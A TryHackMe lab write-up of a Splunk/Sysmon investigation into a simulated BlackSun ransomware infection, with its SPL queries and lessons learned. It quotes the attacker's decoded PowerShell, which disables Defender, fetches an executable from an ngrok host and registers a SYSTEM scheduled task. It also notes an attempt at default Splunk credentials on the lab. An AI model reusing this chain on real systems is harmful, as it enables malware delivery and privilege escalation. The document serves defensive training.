# PS Eclipse (TryHackMe)

- **Type:** Blue-team / SOC - Splunk DFIR investigation (Learn room, not on the Jr Pen Tester path).
- **Room:** PS Eclipse (~15 min) - investigate a ransomware incident on Keegan's workstation with Splunk.
- **Date:** 2026-10-15.
- **Scenario:** SOC analyst at an MSSP (TryNotHackMe). A client reports files with a weird extension on
  Keegan's machine (`DESKTOP-TBV8NEF`), Monday 16 May 2022. Determine what happened.
- **Lab:** Splunk instance at `<ip>` - reached over OpenVPN from the Windows PC (Splunk Web on
  port 80/8000; REST API on 8089). Logged into Splunk Enterprise in the browser (`admin`).
- **Status:** SOLVED - all 10 answers. Verdict: **BlackSun ransomware**, PowerShell-delivered.
- **Data:** `index=main`, Sysmon via `sourcetype="WinEventLog:Microsoft-Windows-Sysmon/Operational"`
  (7,004 events). Set the time picker to **All time** (data is from 2022). Perfmon/WinEventLog:*
  sourcetypes are noise for this hunt.

## Answers

| # | Question | Answer |
|---|---|---|
| 1 | Suspicious binary name | *(find it yourself)* |
| 2 | Address binary was downloaded from (defang) | *(find it yourself)* |
| 3 | Windows exe used to download it (full path) | *(find it yourself)* |
| 4 | Command to configure it to run elevated | *(find it yourself)* |
| 5 | Run-as permission + run command (`User;CommandLine`) | *(find it yourself)* |
| 6 | Remote server it connected to (defang) | *(find it yourself)* |
| 7 | PowerShell script dropped to same location | *(find it yourself)* |
| 8 | Actual name of the malicious script | *(find it yourself)* |
| 9 | Ransom note full path | *(find it yourself)* |
| 10 | Wallpaper image full path | *(find it yourself)* |

## Investigation flow (SPL)

**0. Orient - find the index/sourcetype:**

```spl
index=* | stats count by index, sourcetype
```

**1. Find the download (Q1, Q3).** `*http*` on command lines returned only benign Chrome/Defender
noise, and the common LOLBin names (certutil/bitsadmin/etc.) returned nothing - so catch the binary
where it hits disk with Sysmon FileCreate (EventCode 11):

```spl
index=main sourcetype="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=11 TargetFilename="*.exe"
| table _time, Image, TargetFilename, User | sort _time
```

The tell-tale rows:

```
2022-05-16 13:29:53  powershell.exe → C:\Windows\Temp\OUTSTANDING_GUTTER.exe
2022-05-16 13:30:14  svchost.exe    → C:\Windows\System32\Tasks\OUTSTANDING_GUTTER.exe   (scheduled task)
```

So `powershell.exe` (Q3) wrote `OUTSTANDING_GUTTER.exe` (Q1) into `C:\Windows\Temp`.

**2. Pull the command lines (Q2, Q4, Q5):**

```spl
index=main sourcetype="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1
(Image="*powershell*" OR CommandLine="*OUTSTANDING_GUTTER*" OR CommandLine="*schtasks*" OR CommandLine="*.ps1*")
| table _time, User, ParentImage, Image, CommandLine | sort _time
```

The PowerShell was launched `-exec bypass -enc <base64>`. Decoded (base64 -> UTF-16LE):

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true;                 # disable Defender
wget http://886e-181-215-214-32.ngrok.io/OUTSTANDING_GUTTER.exe -OutFile C:\Windows\Temp\OUTSTANDING_GUTTER.exe;
SCHTASKS /Create /TN "OUTSTANDING_GUTTER.exe" /TR "C:\Windows\Temp\COUTSTANDING_GUTTER.exe" /SC ONEVENT /EC Application /MO *[System/EventID=777] /RU "SYSTEM" /f;
SCHTASKS /Run /TN "OUTSTANDING_GUTTER.exe"
```

- **Q2** = the `wget` source, defanged: *(find it yourself)*.
- **Q4** = the `schtasks /Create` as seen in the `schtasks.exe` *process* command line (full path in
  quotes, args unquoted, `/RU SYSTEM` = the elevation). Note the room wants the process command line,
  not the quoted PowerShell-decoded form.
- **Q5** = `User;CommandLine` of the elevated run = `NT AUTHORITY\SYSTEM` + the `schtasks /Run` command.

**3. C2 - separate the download host from the callback host (Q6).** Sysmon network events
(EventCode 3) from the binary only show rotating AWS IPs (`<ip>`, `<ip>`, ...) on 443 -
those are ngrok tunnel exit nodes. The hostnames are in the DNS queries (EventCode 22):

```spl
index=main sourcetype="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=22 QueryName="*ngrok*"
| table _time, Image, QueryName, QueryResults | sort _time
```

Two distinct subdomains, which is the trap:

```
powershell.exe          → 886e-181-215-214-32.ngrok.io   (download  -> Q2)
OUTSTANDING_GUTTER.exe  → 9030-181-215-214-32.ngrok.io   (C2 callback -> Q6)
```

**4. Ransomware artifacts (Q7-Q10).** FileCreate for scripts/notes/images:

```spl
index=main sourcetype="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=11
(TargetFilename="*.ps1" OR TargetFilename="*.txt" OR TargetFilename="*.png" OR TargetFilename="*.jpg")
| table _time, Image, TargetFilename | sort _time
```

```
13:37:58  powershell.exe → C:\Windows\Temp\script.ps1                                     (Q7)
13:39:30  powershell.exe → C:\Users\keegan\Downloads\vasg6b0wmw029hd\BlackSun_README.txt  (Q9 - ransom note)
13:39:31  powershell.exe → C:\Users\Public\Pictures\blacksun.jpg                          (Q10 - wallpaper)
```

The generic `script.ps1` that Defender flagged is the renamed ransomware script; the `BlackSun_README.txt`
note and `blacksun.jpg` wallpaper identify the family, so its real name is **_(find it yourself)_** (Q8).

## Attack chain (summary)

1. `powershell.exe -exec bypass -enc ...` (parent `cmd.exe`, user keegan) disables Defender real-time
   monitoring, then `wget`s `OUTSTANDING_GUTTER.exe` from an ngrok HTTP tunnel into `C:\Windows\Temp`.
2. Same payload registers a scheduled task (`/RU SYSTEM`, triggered on Application EventID 777) and runs
   it - so the binary executes as `NT AUTHORITY\SYSTEM`.
3. The binary (a reverse-shell/C2 agent) calls back to a *second* ngrok tunnel (`9030-...`) over 443.
4. A second-stage PowerShell (`script.ps1` = BlackSun) encrypts files, drops `BlackSun_README.txt`, and
   swaps the wallpaper to `blacksun.jpg`.

## Lessons learned

- **Map questions to Sysmon EventCodes:** 1 = process creation (Image/CommandLine/User), 3 = network
  (DestinationIp), 11 = file create (TargetFilename), 22 = DNS (QueryName/QueryResults). Most "what/where"
  questions are one filtered `table` away.
- **When `*http*` and LOLBin-name searches miss, pivot to FileCreate.** The download didn't match keyword
  hunts (the URL was inside a base64 blob), but the `.exe` landing on disk exposed both the binary and the
  writing process in one query.
- **Always decode `-enc`.** `base64 -> UTF-16LE` revealed the entire kill chain (download + persistence +
  Defender-disable) in a single string.
- **Download host != C2 host.** EventCode 3 gave only rotating tunnel IPs; EventCode 22 DNS separated the
  `886e` (download) and `9030` (callback) ngrok subdomains. Don't assume one address.
- **Read the answer-format hint before guessing wording.** Two answers only took once the format matched:
  Q2/Q6 wanted full CyberChef defang `hxxp[://]...[.]...` (despite the prompt saying "add http://"), and
  Q5's "command to run the binary" was the `schtasks /Run` line (runs as SYSTEM), not the binary's own
  path. The `**:\...` / `** ...\...` star-masks pinned the exact structure.
- **ICMP/`certutil` assumptions bite:** ping is blocked by default on Windows; "downloaded via certutil"
  is a habit, not a rule - here it was `powershell wget` hidden in base64.

## Reproduction notes

Investigated live over OpenVPN from the Windows PC. Splunk Web reached in-browser; the REST API (8089)
was open but default creds (`admin:changeme`, etc.) were rejected, so the browser search UI was used.
The base64 `-enc` payload was decoded locally in Python (`base64.b64decode(...).decode('utf-16-le')`).
Query results were exported to CSV from Splunk and read back for analysis; no artifacts modified.

## Related

- [owasp-2025-insecure-data-handling](owasp-2025-insecure-data-handling.md) - also decodes/weaponises
  PowerShell/script payloads (attacker side of what this room investigates).
- [metasploit-post-exploitation](metasploit-post-exploitation.md) - the red-team equivalent (SYSTEM
  foothold, scheduled-task/credential tradecraft) this blue-team room is detecting.
